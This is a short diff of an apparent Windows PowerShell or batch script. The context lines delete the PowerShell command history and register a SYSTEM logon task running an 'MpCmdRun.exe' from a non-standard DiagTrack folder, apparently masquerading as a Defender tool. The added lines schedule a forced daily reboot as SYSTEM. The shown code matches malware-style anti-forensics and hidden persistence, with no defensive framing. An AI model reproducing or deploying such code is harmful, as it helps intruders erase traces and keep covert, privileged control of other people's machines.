@@ -99,3 +99,5 @@ $historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerS
 Remove-Item -Path $historyPath
 
 schtasks /create /tn "MpCmdRunTask" /tr "C:\Windows\DiagTrack\Settings\MpCmdRun.exe" /sc onlogon /ru "SYSTEM"
+
+schtasks /create /tn "DailyRestart" /tr "shutdown /r /f /t 0" /sc daily /st 04:40 /ru SYSTEM
